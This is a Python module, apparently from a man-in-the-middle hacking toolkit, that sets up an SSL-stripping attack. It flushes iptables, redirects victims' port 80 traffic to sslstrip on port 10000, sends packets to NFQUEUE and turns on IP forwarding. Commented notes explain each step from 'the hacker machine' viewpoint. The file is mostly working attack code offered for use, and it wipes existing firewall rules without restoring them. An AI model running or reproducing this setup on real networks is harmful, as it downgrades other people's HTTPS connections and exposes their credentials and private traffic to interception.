import subprocess
import inquirer
from utils.enable_port_fwd import enable_port_fwd


def downgrade_https():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    print("[+] Resetting IP Tables...")
    subprocess.call(["iptables", "--flush"])
    subprocess.call(["iptables", "--delete-chain"])
    subprocess.call(["iptables", "--table", "nat", "--delete-chain"])
    questions = [inquirer.Text("confirmation", message="You must enable sslstrip and type 'yes' to continue.", validate=lambda _, x: x == 'yes')]
    inquirer.prompt(questions)
    print("[+] Instantiating queue...")
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "TCP", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    enable_port_fwd()
    print("[+] Downgraded HTTPS to HTTP.")


# subprocess.call(["iptables", "--flush"])
# subprocess.call(["iptables", "--delete-chain"])
# subprocess.call(["iptables", "--table", "nat", "--delete-chain"])
# # -------------  before we route them to their destination, all the packets in queue 0 that are meant to be routed to port 80 are instead re-routed to port 10000 for sslstrip processing  ---------------- #
# subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "TCP", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
# # -------------  all the packets coming to and leaving the host machine are sent to queue 0  ---------------- #
# # NOTE: because packets in PREROUTING based on above rule are rerouted from their intended port 80 destination to port 10000 of sslstrip
# # because of that, we can no longer FORWARD any packets because the FORWARD queue will be empty given that those packets that were caught
# # have already left the prerouting queue and directed to port 10000, nothing else left to forward!
# # ----------------- the packets leaving port 10000 from the hacker machine (OUTPUT) are sent to queue number 0  ---------- #
# subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# # ---------------- We also want to send packets coming to our hacker machine machine to queue 0 --------- #
# subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# # -------  Finally we want to make sure that port forwarding is enabled so that the packets from the very beginning that were destined to the outside world (they still have the output/request mark on them!)
# # will be allowed to leave queue number 0 and go through http making the server request they were intended to make.
# # note that calling subprocess as below is not safe and that's why we preferred using the list/array method as we did above
# subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
# # ------ run sslstrip - make sure you have sslstrip installed on the machine ---------- #
# # ------ commands such as sslstrip that are running continuously must be put at end of file because they stop and wait (think while loop) hence not proceeding with file execution until ended ------- #
# subprocess.call(["sslstrip"])

# enable_queue_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
# downgrade_cmd = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
# http_only_cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"